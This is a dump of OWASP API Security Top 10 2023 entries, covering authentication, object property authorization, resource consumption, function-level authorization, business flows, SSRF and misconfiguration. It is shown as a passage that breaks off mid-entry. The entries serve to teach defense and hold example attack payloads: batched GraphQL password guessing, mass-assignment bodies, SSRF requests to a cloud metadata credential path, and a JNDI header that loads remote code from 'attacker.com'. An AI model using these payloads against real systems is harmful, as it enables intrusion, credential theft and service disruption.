{\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123456\\\"){token}}\"},\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"qwerty\\\"){token}}\"},\n  ...\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123\\\"){token}}\"},\n]\n```\n\n## Scenario #2\n\nIn order to update the email address associated with a user's account, clients\nshould issue an API request like the one below:\n\n```\nPUT /account\nAuthorization: Bearer <token>\n\n{ \"email\": \"<new_email_address>\" }\n```\n\nBecause the API does not require users to confirm their identity by providing\ntheir current password, bad actors able to put themselves in a position to\nsteal the auth token might be able to take over the victim's account by starting\nthe reset password workflow after updating the email address of the victim's\naccount.\n\n## How To Prevent\n\n* Make sure you know all the possible flows to authenticate to the API\n  (mobile/ web/deep links that implement one-click authentication/etc.). Ask\n  your engineers what flows you missed.\n* Read about your authentication mechanisms. Make sure you understand what and\n  how they are used. OAuth is not authentication, and neither are API keys.\n* Don't reinvent the wheel in authentication, token generation, or password\n  storage. Use the standards.\n* Credential recovery/forgot password endpoints should be treated as login\n  endpoints in terms of brute force, rate limiting, and lockout protections.\n* Require re-authentication for sensitive operations (e.g. changing the account\n  owner email address/2FA phone number).\n* Use the [OWASP Authentication Cheatsheet][1].\n* Where possible, implement multi-factor authentication.\n* Implement anti-brute force mechanisms to mitigate credential stuffing,\n  dictionary attacks, and brute force attacks on your authentication endpoints.\n  This mechanism should be stricter than the regular rate limiting mechanisms\n  on your APIs.\n* Implement [account lockout][2]/captcha mechanisms to prevent brute force\n  attacks against specific users. Implement weak-password checks.\n* API keys should not be used for user authentication. They should only be used\n  for [API clients][3] authentication.\n\n## References\n\n### OWASP\n\n* [Authentication Cheat Sheet][1]\n* [Key Management Cheat Sheet][4]\n* [Credential Stuffing][5]\n\n### External\n\n* [CWE-204: Observable Response Discrepancy][6]\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][7]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism(OTG-AUTHN-003)\n[3]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html\n[5]: https://owasp.org/www-community/attacks/Credential_stuffing\n[6]: https://cwe.mitre.org/data/definitions/204.html\n[7]: https://cwe.mitre.org/data/definitions/307.html\n", "timestamp": "2025-10-24T22:26:49.904274"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xa3-broken-object-property-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa3-broken-object-property-level-authorization.md", "content": "# API3:2023 Broken Object Property Level Authorization\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Easy** | Technical **Moderate** : Business Specific |\n| APIs tend to expose endpoints that return all object’s properties. This is particularly valid for REST APIs. For other protocols such as GraphQL, it may require crafted requests to specify which properties should be returned. Identifying these additional properties that can be manipulated requires more effort, but there are a few automated tools available to assist in this task. | Inspecting API responses is enough to identify sensitive information in returned objects’ representations. Fuzzing is usually used to identify additional (hidden) properties. Whether they can be changed is a matter of crafting an API request and analyzing the response. Side-effect analysis may be required if the target property is not returned in the API response. | Unauthorized access to private/sensitive object properties may result in data disclosure, data loss, or data corruption. Under certain circumstances, unauthorized access to object properties can lead to privilege escalation or partial/full account takeover. |\n\n## Is the API Vulnerable?\n\nWhen allowing a user to access an object using an API endpoint, it is important\nto validate that the user has access to the specific object properties they are\ntrying to access.\n\nAn API endpoint is vulnerable if:\n\n* The API endpoint exposes properties of an object that are considered\n  sensitive and should not be read by the user. (previously named: \"[Excessive\n  Data Exposure][1]\")\n* The API endpoint allows a user to change, add/or delete the value of a\n  sensitive object's property which the user should not be able to access\n  (previously named: \"[Mass Assignment][2]\")\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nA dating app allows a user to report other users for inappropriate behavior.\nAs part of this flow, the user clicks on a \"report\" button, and the following\nAPI call is triggered:\n\n```\nPOST /graphql\n{\n  \"operationName\":\"reportUser\",\n  \"variables\":{\n    \"userId\": 313,\n    \"reason\":[\"offensive behavior\"]\n  },\n  \"query\":\"mutation reportUser($userId: ID!, $reason: String!) {\n    reportUser(userId: $userId, reason: $reason) {\n      status\n      message\n      reportedUser {\n        id\n        fullName\n        recentLocation\n      }\n    }\n  }\"\n}\n```\n\nThe API Endpoint is vulnerable since it allows the authenticated user to have\naccess to sensitive (reported) user object properties, such as \"fullName\" and\n\"recentLocation\" that are not supposed to be accessed by other users.\n\n### Scenario #2\n\nAn online marketplace platform, that offers one type of users (\"hosts\") to rent\nout their apartment to another type of users (\"guests\"), requires the host to\naccept a booking made by a guest, before charging the guest for the stay.\n\nAs part of this flow, an API call is sent by the host to\n`POST /api/host/approve_booking` with the following legitimate payload:\n\n```\n{\n  \"approved\": true,\n  \"comment\": \"Check-in is after 3pm\"\n}\n```\n\nThe host replays the legitimate request, and adds the following malicious\npayload:\n\n```\n{\n  \"approved\": true,\n  \"comment\": \"Check-in is after 3pm\",\n  \"total_stay_price\": \"$1,000,000\"\n}\n```\n\nThe API endpoint is vulnerable because there is no validation that the host\nshould have access to the internal object property - `total_stay_price`, and\nthe guest will be charged more than she was supposed to be.\n\n### Scenario #3\n\nA social network that is based on short videos, enforces restrictive content\nfiltering and censorship. Even if an uploaded video is blocked, the user can\nchange the description of the video using the following API request:\n\n```\nPUT /api/video/update_video\n\n{\n  \"description\": \"a funny video about cats\"\n}\n```\n\nA frustrated user can replay the legitimate request, and add the following\nmalicious payload:\n\n```\n{\n  \"description\": \"a funny video about cats\",\n  \"blocked\": false\n}\n```\n\nThe API endpoint is vulnerable because there is no validation if the user\nshould have access to the internal object property - `blocked`, and the user\ncan change the value from `true` to `false` and unlock their own blocked\ncontent.\n\n## How To Prevent\n\n* When exposing an object using an API endpoint, always make sure that the user\n  should have access to the object's properties you expose.\n* Avoid using generic methods such as `to_json()` and `to_string()`. Instead,\n  cherry-pick specific object properties you specifically want to return.\n* If possible, avoid using functions that automatically bind a client's input\n  into code variables, internal objects, or object properties\n  (\"Mass Assignment\").\n* Allow changes only to the object's properties that should be updated by the\n  client.\n* Implement a schema-based response validation mechanism as an extra layer of\n  security. As part of this mechanism, define and enforce data returned by all\n  API methods.\n* Keep returned data structures to the bare minimum, according to the\n  business/functional requirements for the endpoint.\n\n## References\n\n### OWASP\n\n* [API3:2019 Excessive Data Exposure - OWASP API Security Top 10 2019][1]\n* [API6:2019 - Mass Assignment - OWASP API Security Top 10 2019][2]\n* [Mass Assignment Cheat Sheet][3]\n\n### External\n\n* [CWE-213: Exposure of Sensitive Information Due to Incompatible Policies][4]\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][5]\n\n[1]: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\n[4]: https://cwe.mitre.org/data/definitions/213.html\n[5]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:50.023512"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xa4-unrestricted-resource-consumption.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa4-unrestricted-resource-consumption.md", "content": "# API4:2023 Unrestricted Resource Consumption\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Average** | Prevalence **Widespread** : Detectability **Easy** | Technical **Severe** : Business Specific |\n| Exploitation requires simple API requests. Multiple concurrent requests can be performed from a single local computer or by using cloud computing resources. Most of the automated tools available are designed to cause DoS via high loads of traffic, impacting APIs’ service rate. | It's common to find APIs that do not limit client interactions or resource consumption. Crafted API requests, such as those including parameters that control the number of resources to be returned and performing response status/time/length analysis should allow identification of the issue. The same is valid for batched operations. Although threat agents don't have visibility over costs impact, this can be inferred based on service providers’ (e.g. cloud provider) business/pricing model. | Exploitation can lead to DoS due to resource starvation, but it can also lead to operational costs increase such as those related to the infrastructure due to higher CPU demand, increasing cloud storage needs, etc. |\n\n## Is the API Vulnerable?\n\nSatisfying API requests requires resources such as network bandwidth, CPU,\nmemory, and storage. Sometimes required resources are made available by service\nproviders via API integrations, and paid for per request, such as sending\nemails/SMS/phone calls, biometrics validation, etc.\n\nAn API is vulnerable if at least one of the following limits is missing or set\ninappropriately (e.g. too low/high):\n\n* Execution timeouts\n* Maximum allocable memory\n* Maximum number of file descriptors\n* Maximum number of processes\n* Maximum upload file size\n* Number of operations to perform in a single API client request (e.g. GraphQL\n  batching)\n* Number of records per page to return in a single request-response\n* Third-party service providers' spending limit\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nA social network implemented a “forgot password” flow using SMS verification,\nenabling the user to receive a one time token via SMS in order to reset their\npassword.\n\nOnce a user clicks on \"forgot password\" an API call is sent from the user's\nbrowser to the back-end API:\n\n```\nPOST /initiate_forgot_password\n\n{\n  \"step\": 1,\n  \"user_number\": \"6501113434\"\n}\n```\n\nThen, behind the scenes, an API call is sent from the back-end to a 3rd party\nAPI that takes care of the SMS delivering:\n\n```\nPOST /sms/send_reset_pass_code\n\nHost: willyo.net\n\n{\n  \"phone_number\": \"6501113434\"\n}\n```\n\nThe 3rd party provider, Willyo, charges $0.05 per this type of call.\n\nAn attacker writes a script that sends the first API call tens of thousands of\ntimes. The back-end follows and requests Willyo to send tens of thousands of\ntext messages, leading the company to lose thousands of dollars in a matter of\nminutes.\n\n### Scenario #2\n\nA GraphQL API Endpoint allows the user to upload a profile picture.\n\n```\nPOST /graphql\n\n{\n  \"query\": \"mutation {\n    uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {\n      url\n    }\n  }\"\n}\n```\n\nOnce the upload is complete, the API generates multiple thumbnails with\ndifferent sizes based on the uploaded picture. This graphical operation takes a\nlot of memory from the server.\n\nThe API implements a traditional rate limiting protection - a user can't access\nthe GraphQL endpoint too many times in a short period of time. The API also\nchecks for the uploaded picture's size before generating thumbnails to avoid\nprocessing pictures that are too large.\n\nAn attacker can easily bypass those mechanisms, by leveraging the flexible\nnature of GraphQL:\n\n```\nPOST /graphql\n\n[\n  {\"query\": \"mutation {uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  {\"query\": \"mutation {uploadPic(name: \\\"pic2\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  ...\n  {\"query\": \"mutation {uploadPic(name: \\\"pic999\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n}\n```\n\nBecause the API does not limit the number of times the `uploadPic` operation can\nbe attempted, the call will lead to exhaustion of server memory and Denial of\nService.\n\n### Scenario #3\n\nA service provider allows clients to download arbitrarily large files using its\nAPI. These files are stored in cloud object storage and they don't change that\noften. The service provider relies on a cache service to have a better service\nrate and to keep bandwidth consumption low. The cache service only caches files\nup to 15GB.\n\nWhen one of the files gets updated, its size increases to 18GB. All service\nclients immediately start pulling the new version. Because there were no\nconsumption cost alerts, nor a maximum cost allowance for the cloud service,\nthe next monthly bill increases from US$13, on average, to US$8k.\n\n## How To Prevent\n\n* Use a solution that makes it easy to limit [memory][1],\n  [CPU][2], [number of restarts][3], [file descriptors, and processes][4] such\n  as Containers / Serverless code (e.g. Lambdas).\n* Define and enforce a maximum size of data on all incoming parameters and\n  payloads, such as maximum length for strings, maximum number of elements in\n  arrays, and maximum upload file size (regardless of whether it is stored\n  locally or in cloud storage).\n* Implement a limit on how often a client can interact with the API within a\n  defined timeframe (rate limiting).\n* Rate limiting should be fine tuned based on the business needs. Some API\n  Endpoints might require stricter policies.\n* Limit/throttle how many times or how often a single API client/user can\n  execute a single operation (e.g. validate an OTP, or request password\n  recovery without visiting the one-time URL).\n* Add proper server-side validation for query string and request body\n  parameters, specifically the one that controls the number of records to be\n  returned in the response.\n* Configure spending limits for all service providers/API integrations. When\n  setting spending limits is not possible, billing alerts should be configured\n  instead.\n\n## References\n\n### OWASP\n\n* [\"Availability\" - Web Service Security Cheat Sheet][5]\n* [\"DoS Prevention\" - GraphQL Cheat Sheet][6]\n* [\"Mitigating Batching Attacks\" - GraphQL Cheat Sheet][7]\n\n### External\n\n* [CWE-770: Allocation of Resources Without Limits or Throttling][8]\n* [CWE-400: Uncontrolled Resource Consumption][9]\n* [CWE-799: Improper Control of Interaction Frequency][10]\n* \"Rate Limiting (Throttling)\" - [Security Strategies for Microservices-based\n  Application Systems][11], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#ulimit\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#availability\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#dos-prevention\n[7]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#mitigating-batching-attacks\n[8]: https://cwe.mitre.org/data/definitions/770.html\n[9]: https://cwe.mitre.org/data/definitions/400.html\n[10]: https://cwe.mitre.org/data/definitions/799.html\n[11]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204.pdf\n", "timestamp": "2025-10-24T22:26:50.141433"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa5-broken-function-level-authorization.md", "content": "# API5:2023 Broken Function Level Authorization\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Easy** | Technical **Severe** : Business Specific |\n| Exploitation requires the attacker to send legitimate API calls to an API endpoint that they should not have access to as anonymous users or regular, non-privileged users. Exposed endpoints will be easily exploited. | Authorization checks for a function or resource are usually managed via configuration or code level. Implementing proper checks can be a confusing task since modern applications can contain many types of roles, groups, and complex user hierarchies (e.g. sub-users, or users with more than one role). It's easier to discover these flaws in APIs since APIs are more structured, and accessing different functions is more predictable. | Such flaws allow attackers to access unauthorized functionality. Administrative functions are key targets for this type of attack and may lead to data disclosure, data loss, or data corruption. Ultimately, it may lead to service disruption. |\n\n## Is the API Vulnerable?\n\nThe best way to find broken function level authorization issues is to perform\na deep analysis of the authorization mechanism while keeping in mind the user\nhierarchy, different roles or groups in the application, and asking the\nfollowing questions:\n\n* Can a regular user access administrative endpoints?\n* Can a user perform sensitive actions (e.g. creation, modification, or\n  deletion ) that they should not have access to by simply changing the HTTP\n  method (e.g. from `GET` to `DELETE`)?\n* Can a user from group X access a function that should be exposed only to\n  users from group Y, by simply guessing the endpoint URL and parameters\n  (e.g. `/api/v1/users/export_all`)?\n\nDon't assume that an API endpoint is regular or administrative only based on\nthe URL path.\n\nWhile developers might choose to expose most of the administrative endpoints\nunder a specific relative path, like `/api/admins`, it's very common to find\nthese administrative endpoints under other relative paths together with regular\nendpoints, like `/api/users`.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nDuring the registration process for an application that allows only invited\nusers to join, the mobile application triggers an API call to\n`GET /api/invites/{invite_guid}`. The response contains a JSON with details\nabout the invite, including the user's role and the user's email.\n\nAn attacker duplicates the request and manipulates the HTTP method and endpoint\nto `POST /api/invites/new`. This endpoint should only be accessed by\nadministrators using the admin console. The endpoint does not implement\nfunction level authorization checks.\n\nThe attacker exploits the issue and sends a new invite with admin privileges:\n\n```\nPOST /api/invites/new\n\n{\n  \"email\": \"attacker@somehost.com\",\n  \"role\":\"admin\"\n}\n```\n\nLater on, the attacker uses the maliciously crafted invite in order to create\nthemselves an admin account and gain full access to the system.\n\n### Scenario #2\n\nAn API contains an endpoint that should be exposed only to administrators -\n`GET /api/admin/v1/users/all`. This endpoint returns the details of all the\nusers of the application and does not implement function level authorization\nchecks. An attacker who learned the API structure takes an educated guess and\nmanages to access this endpoint, which exposes sensitive details of the users\nof the application.\n\n## How To Prevent\n\nYour application should have a consistent and easy-to-analyze authorization\nmodule that is invoked from all your business functions. Frequently, such\nprotection is provided by one or more components external to the application\ncode.\n\n* The enforcement mechanism(s) should deny all access by default, requiring\n  explicit grants to specific roles for access to every function.\n* Review your API endpoints against function level authorization flaws, while\n  keeping in mind the business logic of the application and groups hierarchy.\n* Make sure that all of your administrative controllers inherit from an\n  administrative abstract controller that implements authorization checks\n  based on the user's group/role.\n* Make sure that administrative functions inside a regular controller implement\n  authorization checks based on the user's group and role.\n\n## References\n\n### OWASP\n\n* [Forced Browsing][1]\n* \"A7: Missing Function Level Access Control\", [OWASP Top 10 2013][2]\n* [Access Control][3]\n\n### External\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://owasp.org/www-community/attacks/Forced_browsing\n[2]: https://github.com/OWASP/Top10/raw/master/2013/OWASP%20Top%2010%20-%202013.pdf\n[3]: https://owasp.org/www-community/Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:50.271863"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows.md", "content": "# API6:2023 Unrestricted Access to Sensitive Business Flows\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Average** | Technical **Moderate** : Business Specific |\n| Exploitation usually involves understanding the business model backed by the API, finding sensitive business flows, and automating access to these flows, causing harm to the business. | Lack of a holistic view of the API in order to fully support business requirements tends to contribute to the prevalence of this issue. Attackers manually identify what resources (e.g. endpoints) are involved in the target workflow and how they work together. If mitigation mechanisms are already in place, attackers need to find a way to bypass them. | In general technical impact is not expected. Exploitation might hurt the business in different ways, for example: prevent legitimate users from purchasing a product, or lead to inflation in the internal economy of a game. |\n\n## Is the API Vulnerable?\n\nWhen creating an API Endpoint, it is important to understand which business flow\nit exposes. Some business flows are more sensitive than others, in the sense\nthat excessive access to them may harm the business.\n\nCommon examples of sensitive business flows and risk of excessive access\nassociated with them:\n\n* Purchasing a product flow - an attacker can buy all the stock of a high-demand\n  item at once and resell for a higher price (scalping)\n* Creating a comment/post flow - an attacker can spam the system\n* Making a reservation - an attacker can reserve all the available time slots\n  and prevent other users from using the system\n\nThe risk of excessive access might change between industries and businesses.\nFor example - creation of posts by a script might be considered as a risk of\nspam by one social network, but encouraged by another social network.\n\nAn API Endpoint is vulnerable if it exposes a sensitive business flow, without\nappropriately restricting the access to it.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nA technology company announces they are going to release a new gaming console on\nThanksgiving. The product has a very high demand and the stock is limited. An\nattacker writes code to automatically buy the new product and complete the\ntransaction.\n\nOn the release day, the attacker runs the code distributed across different IP\naddresses and locations. The API doesn't implement the appropriate protection\nand allows the attacker to buy the majority of the stock before other legitimate\nusers.\n\nLater on, the attacker sells the product on another platform for a much higher\nprice.\n\n### Scenario #2\n\nAn airline company offers online ticket purchasing with no cancellation fee. A\nuser with malicious intentions books 90% of the seats of a desired flight.\n\nA few days before the flight the malicious user canceled all the tickets at\nonce, which forced the airline to discount the ticket prices in order to fill\nthe flight.\n\nAt this point, the user buys herself a single ticket that is much cheaper than\nthe original one.\n\n### Scenario #3\n\nA ride-sharing app provides a referral program - users can invite their friends\nand gain credit for each friend who has joined the app. This credit can be later\nused as cash to book rides.\n\nAn attacker exploits this flow by writing a script to automate the registration\nprocess, with each new user adding credit to the attacker's wallet.\n\nThe attacker can later enjoy free rides or sell the accounts with excessive\ncredits for cash.\n\n## How To Prevent\n\nThe mitigation planning should be done in two layers:\n\n* Business - identify the business flows that might harm the business if they\n  are excessively used.\n* Engineering - choose the right protection mechanisms to mitigate the business\n  risk.\n\n    Some of the protection mechanisms are more simple while others are more\n    difficult to implement. The following methods are used to slow down\n    automated\n    threats:\n\n    * Device fingerprinting: denying service to unexpected client devices (e.g\n      headless browsers) tends to make threat actors use more sophisticated\n      solutions, thus more costly for them\n    * Human detection: using either captcha or more advanced biometric solutions\n      (e.g. typing patterns)\n    * Non-human patterns: analyze the user flow to detect non-human patterns\n      (e.g. the user accessed the \"add to cart\" and \"complete purchase\"\n      functions in less than one second)\n    * Consider blocking IP addresses of Tor exit nodes and well-known proxies\n\n    Secure and limit access to APIs that are consumed directly by machines (such\n    as developer and B2B APIs). They tend to be an easy target for attackers\n    because they often don't implement all the required protection mechanisms.\n\n## References\n\n### OWASP\n\n* [OWASP Automated Threats to Web Applications][1]\n* [API10:2019 Insufficient Logging & Monitoring][2]\n\n[1]: https://owasp.org/www-project-automated-threats-to-web-applications/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xaa-insufficient-logging-monitoring/\n\n", "timestamp": "2025-10-24T22:26:50.392430"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xa7-server-side-request-forgery.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa7-server-side-request-forgery.md", "content": "# API7:2023 Server Side Request Forgery\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Easy** | Prevalence **Common** : Detectability **Easy** | Technical **Moderate** : Business Specific |\n| Exploitation requires the attacker to find an API endpoint that accesses a URI that’s provided by the client. In general, basic SSRF (when the response is returned to the attacker), is easier to exploit than Blind SSRF in which the attacker has no feedback on whether or not the attack was successful. | Modern concepts in application development encourage developers to access URIs provided by the client. Lack of or improper validation of such URIs are common issues. Regular API requests and response analysis will be required to detect the issue. When the response is not returned (Blind SSRF) detecting the vulnerability requires more effort and creativity. | Successful exploitation might lead to internal services enumeration (e.g. port scanning), information disclosure, bypassing firewalls, or other security mechanisms. In some cases, it can lead to DoS or the server being used as a proxy to hide malicious activities. |\n\n## Is the API Vulnerable?\n\nServer-Side Request Forgery (SSRF) flaws occur when an API is fetching a remote\nresource without validating the user-supplied URL. It enables an attacker to\ncoerce the application to send a crafted request to an unexpected destination,\neven when protected by a firewall or a VPN.\n\nModern concepts in application development make SSRF more common and more\ndangerous.\n\nMore common - the following concepts encourage developers to access an external\nresource based on user input: Webhooks, file fetching from URLs, custom SSO,\nand URL previews.\n\nMore dangerous - Modern technologies like cloud providers, Kubernetes, and\nDocker expose management and control channels over HTTP on predictable,\nwell-known paths. Those channels are an easy target for an SSRF attack.\n\nIt is also more challenging to limit outbound traffic from your application,\nbecause of the connected nature of modern applications.\n\nThe SSRF risk can not always be completely eliminated. While choosing a\nprotection mechanism, it is important to consider the business risks and needs.\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nA social network allows users to upload profile pictures. The user can choose\neither to upload the image file from their machine, or provide the URL of the\nimage. Choosing the second, will trigger the following API call:\n\n```\nPOST /api/profile/upload_picture\n\n{\n  \"picture_url\": \"http://example.com/profile_pic.jpg\"\n}\n```\n\nAn attacker can send a malicious URL and initiate port scanning within the\ninternal network using the API Endpoint.\n\n```\n{\n  \"picture_url\": \"localhost:8080\"\n}\n```\n\nBased on the response time, the attacker can figure out whether the port is\nopen or not.\n\n### Scenario #2\n\nA security product generates events when it detects anomalies in the network.\nSome teams prefer to review the events in a broader, more generic monitoring\nsystem, such as a SIEM (Security Information and Event Management). For this\npurpose, the product provides integration with other systems using webhooks.\n\nAs part of a creation of a new webhook, a GraphQL mutation is sent with the URL\nof the SIEM API.\n\n```\nPOST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://www.siem-system.com/create_new_event\\\",\n              send_test_req: true\n            }\n          ]\n    \t  }\n  \t  }){\n    \tchannelId\n  \t}\n\t}\"\n  }\n]\n\n```\n\nDuring the creation process, the API back-end sends a test request to the\nprovided webhook URL, and presents to the user the response.\n\nAn attacker can leverage this flow, and make the API request a sensitive\nresource, such as an internal cloud metadata service that exposes credentials:\n\n```\nPOST /graphql\n\n[\n  {\n    \"variables\": {},\n    \"query\": \"mutation {\n      createNotificationChannel(input: {\n        channelName: \\\"ch_piney\\\",\n        notificationChannelConfig: {\n          customWebhookChannelConfigs: [\n            {\n              url: \\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\\\",\n              send_test_req: true\n            }\n          ]\n        }\n      }) {\n        channelId\n      }\n    }\n  }\n]\n```\n\nSince the application shows the response from the test request, the attacker\ncan view the credentials of the cloud environment.\n\n## How To Prevent\n\n* Isolate the resource fetching mechanism in your network: usually these\n  features are aimed to retrieve remote resources and not internal ones.\n* Whenever possible, use allow lists of:\n    * Remote origins users are expected to download resources from (e.g. Google\n      Drive, Gravatar, etc.)\n    * URL schemes and ports\n    * Accepted media types for a given functionality\n* Disable HTTP redirections.\n* Use a well-tested and maintained URL parser to avoid issues caused by URL\n  parsing inconsistencies.\n* Validate and sanitize all client-supplied input data.\n* Do not send raw responses to clients.\n\n## References\n\n### OWASP\n\n* [Server Side Request Forgery][1]\n* [Server-Side Request Forgery Prevention Cheat Sheet][2]\n\n### External\n\n* [CWE-918: Server-Side Request Forgery (SSRF)][3]\n* [URL confusion vulnerabilities in the wild: Exploring parser inconsistencies,\n   Snyk][4]\n\n[1]: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n[2]: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n[3]: https://cwe.mitre.org/data/definitions/918.html\n[4]: https://snyk.io/blog/url-confusion-vulnerabilities/\n", "timestamp": "2025-10-24T22:26:50.514080"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/en/0xa8-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md", "content": "# API8:2023 Security Misconfiguration\n\n| Threat agents/Attack vectors | Security Weakness | Impacts |\n| - | - | - |\n| API Specific : Exploitability **Easy** | Prevalence **Widespread** : Detectability **Easy** | Technical **Severe** : Business Specific |\n| Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories to gain unauthorized access or knowledge of the system. Most of this is public knowledge and exploits may be available. | Security misconfiguration can happen at any level of the API stack, from the network level to the application level. Automated tools are available to detect and exploit misconfigurations such as unnecessary services or legacy options. | Security misconfigurations not only expose sensitive user data, but also system details that can lead to full server compromise. |\n\n## Is the API Vulnerable?\n\nThe API might be vulnerable if:\n\n* Appropriate security hardening is missing across any part of the API stack,\n  or if there are improperly configured permissions on cloud services\n* The latest security patches are missing, or the systems are out of date\n* Unnecessary features are enabled (e.g. HTTP verbs, logging features)\n* There are discrepancies in the way incoming requests are processed by servers\n  in the HTTP server chain\n* Transport Layer Security (TLS) is missing\n* Security or cache control directives are not sent to clients\n* A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set\n* Error messages include stack traces, or expose other sensitive information\n\n## Example Attack Scenarios\n\n### Scenario #1\n\nAn API back-end server maintains an access log written by a popular third-party\nopen-source logging utility with support for placeholder expansion and JNDI\n(Java Naming and Directory Interface) lookups, both enabled by default. For\neach request, a new entry is written to the log file with the following\npattern: `<method> <api_version>/<path> - <status_code>`.\n\nA bad actor issues the following API request, which gets written to the access\nlog file:\n\n```\nGET /health\nX-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}\n```\n\nDue to the insecure default configuration of the logging utility and a\npermissive network outbound policy, in order to write the corresponding entry\nto the access log, while expanding the value in the `X-Api-Version` request\nheader, the logging utility will pull and execute the `Malicious.class` object\nfrom the attacker's remote controlled server.\n\n### Scenario #2\n\nA social network website offers a \"Direct Message\" feature that allows users to\nkeep private conversations. To retrieve new messages for a specific\nconversation, the website issues the following API request (user interaction is\nnot required):\n\n```\nGET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA\n```\n\nBecause the API response does not include the `Cache-Control` HTTP response\nheader, private conversations end-up cached by the web browser, allowing\nmalicious actors to retrieve them from the browser cache files in the\nfilesystem.\n\n## How To Prevent\n\nThe API life cycle should include:\n\n* A repeatable hardening process leading to fast and easy deployment of a\n  properly locked down environment\n* A task to review and update configurations across the entire API stack. The\n  review should include: orchestration files, API components, and cloud\n  services (e.g. S3 bucket permissions)\n* An automated process to continuously assess the effectiveness of the\n  configuration and settings in all environments\n\nFurthermore:\n\n* Ensure that all API communications from the client to the API server and any\n  downstream/upstream components happen over an encrypted communication channel\n  (TLS), regardless of whether it is an internal or public-facing API.\n* Be specific about which HTTP verbs each API can be accessed by: all other\n  HTTP verbs should be disabled (e.g. HEAD).\n* APIs expecting to be accessed from browser-based clients (e.g., WebApp\n  front-end) should, at least:\n    * implement a proper Cross-Origin Resource Sharing (CORS) policy\n    * include applicable Security Headers\n* Restrict incoming content types/data formats to those that meet the business/\n  functional requirements.\n* Ensure all servers in the HTTP server chain (e.g. load balancers, reverse\n  and forward proxies, and back-end servers) process incoming requests in a\n  uniform manner to avoid desync issues.\n* Where applicable, define and enforce all API response payload schemas,\n  including error responses, to prevent exception traces and other valuable\n  information from being sent back to attackers.\n\n## References\n\n### OWASP\n\n* [OWASP Secure Headers 